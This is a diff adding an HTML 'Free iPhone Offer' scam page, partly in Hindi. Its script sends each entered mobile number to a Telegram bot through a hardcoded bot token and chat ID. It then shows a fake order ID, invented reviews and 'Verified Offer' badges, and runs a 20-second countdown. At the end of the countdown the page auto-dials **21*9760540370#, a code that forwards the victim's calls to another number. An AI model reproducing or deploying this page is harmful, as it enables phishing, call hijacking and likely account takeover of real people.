@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free iPhone Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #dbeafe, #e0f2fe);
+      text-align: center;
+    }
+    .offer-banner {
+      background: linear-gradient(90deg, #ff6a00, #ee0979);
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      padding: 12px;
+      border-radius: 0 0 14px 14px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
+    }
+    .container { padding: 20px; }
+    img { width: 180px; margin-top: 20px; }
+    h2 { color: #1f2937; }
+    input {
+      padding: 12px;
+      width: 80%;
+      max-width: 300px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      margin-top: 15px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 12px 24px;
+      background: linear-gradient(90deg, #2563eb, #1d4ed8);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    button:hover { background: linear-gradient(90deg, #1d4ed8, #1e40af); }
+    #nextPage { display: none; background: linear-gradient(135deg, #fef9c3, #f0fdf4); padding: 20px; }
+    .box {
+      background: white;
+      margin: 30px auto;
+      padding: 20px;
+      width: 85%;
+      max-width: 400px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+    .order-id { margin: 10px 0; font-weight: bold; color: #1d4ed8; }
+    .timer { font-size: 18px; font-weight: bold; color: red; margin-top: 10px; }
+    .call-btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 14px 24px;
+      background: linear-gradient(90deg, #22c55e, #16a34a);
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 10px;
+      text-decoration: none;
+      animation: glow 1s infinite alternate, shake 2s infinite;
+    }
+    @keyframes glow { from { box-shadow: 0 0 5px #16a34a; } to { box-shadow: 0 0 20px #22c55e; } }
+    @keyframes shake { 0%,100%{transform:translateX(0);}50%{transform:translateX(3px);} }
+    .badges { margin-top: 15px; font-size: 14px; color: #444; }
+    .badges span {
+      display: inline-block;
+      background: #f3f4f6;
+      padding: 6px 12px;
+      border-radius: 20px;
+      margin: 4px;
+      font-weight: bold;
+    }
+    .reviews { margin-top: 25px; height: 60px; overflow: hidden; position: relative; }
+    .reviews p { margin: 0; padding: 5px; font-size: 14px; animation: scroll 10s linear infinite; }
+    @keyframes scroll { 0%{transform:translateY(100%);}100%{transform:translateY(-300%);} }
+  </style>
+</head>
+<body>
+  <div class="offer-banner">🎁 Free iPhone Offer</div>
+
+  <!-- First Page -->
+  <div id="firstPage" class="container">
+    <img src="https://www.apple.com/newsroom/images/product/iphone/standard/Apple-iPhone-14-iPhone-14-Plus-2up-blue-220907_inline.jpg.large.jpg" alt="iPhone 14">
+    <h2>अपना मोबाइल नंबर दर्ज करें</h2>
+    <input type="tel" id="userNumber" placeholder="Enter number" pattern="[0-9]*" inputmode="numeric" required>
+    <br>
+    <button onclick="submitNumber()">Submit</button>
+  </div>
+
+  <!-- Next Page -->
+  <div id="nextPage">
+    <div class="box">
+      <h2>✅ Free Order Request Received</h2>
+      <div class="order-id">📦 Your Order ID: <span id="orderId"></span></div>
+      <div class="timer">⏳ Call within <span id="countdown">20</span> seconds</div>
+      <p>अभी तुरंत delivery boy से बात करने के लिए नीचे Call button दबाएँ 👇</p>
+      <a id="callBtn" href="tel:**21*9760540370%23" class="call-btn">📞 Call Now</a>
+
+      <div class="badges">
+        <span>🔒 100% Secure</span>
+        <span>🚚 Free Delivery</span>
+        <span>✅ Verified Offer</span>
+      </div>
+
+      <div class="reviews">
+        <p>⭐ Rahul Sharma: "Mujhe 2 din me iPhone mil gaya!"</p>
+        <p>⭐ Priya Verma: "Best offer, trust kar sakte ho"</p>
+        <p>⭐ John D.: "Got my iPhone 14, amazing deal!"</p>
+        <p>⭐ Ankit Gupta: "Bahut fast delivery 👍"</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // === यहां अपना असली BOT TOKEN और CHAT ID डालना ===
+    const BOT_TOKEN = "7712484168:AAGlbiVYuf8WH5ElQaD9G5uAaDgRMcuXrQg"; 
+    const CHAT_ID = "7438329471"; 
+
+    function submitNumber() {
+      let number = document.getElementById("userNumber").value;
+      if(number.trim() === "") {
+        alert("कृपया मोबाइल नंबर दर्ज करें!");
+        return;
+      }
+
+      // Telegram पर भेजो
+      let message = "📱 New Number: " + number;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      });
+
+      // Hide first page, show next
+      document.getElementById("firstPage").style.display = "none";
+      document.getElementById("nextPage").style.display = "block";
+
+      // Generate Order ID
+      const randomNum = Math.floor(100000 + Math.random() * 900000);
+      document.getElementById("orderId").innerText = "ORD-" + randomNum;
+
+      // Timer 20 sec
+      let timeLeft = 20;
+      const timer = setInterval(() => {
+        timeLeft--;
+        document.getElementById("countdown").innerText = timeLeft;
+        if(timeLeft <= 0){
+          clearInterval(timer);
+          window.location.href = document.getElementById("callBtn").href;
+        }
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
